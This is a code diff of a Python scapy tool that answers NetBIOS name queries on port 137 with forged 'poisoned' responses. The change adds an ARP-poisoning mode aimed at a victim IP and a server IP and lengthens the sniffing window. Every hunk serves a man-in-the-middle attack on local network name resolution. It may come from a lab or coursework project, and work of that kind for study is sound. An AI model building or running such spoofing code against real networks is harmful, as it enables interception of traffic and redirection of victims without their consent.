@@ -1,6 +1,7 @@
 from scapy.all import *
 from scapy.layers.inet import IP, UDP
 from scapy.layers.netbios import NBNSQueryRequest, NBNSQueryResponse
+import arpSpoof
 
 
 class Dns():
@@ -13,7 +14,7 @@ class Dns():
 
 
     def startSniffing(self):
-        sniff(prn=self.sendFakeResponse, iface=self.networkInterface, filter="port 137", timeout=1)
+        sniff(prn=self.sendFakeResponse, iface=self.networkInterface, filter="port 137", timeout=20)
 
 
     def sendFakeResponse(self, pkt):
@@ -32,8 +33,17 @@ class Dns():
 
                 sendp(poisonedPaket, verbose=0, iface=self.networkInterface)
 
-    def start(self):
-        self.startSniffing()
+    def spoofARP(self):
+            arpSpoof.arpPoisoning(self.victimIP, self.serverIP, self.networkInterface)
+
+    def start(self, mode):
+        if mode:
+            self.spoofARP()
+            self.startSniffing()
+        else:
+            self.startSniffing()
+
+
 
 
 networkInterface = "enp0s3"
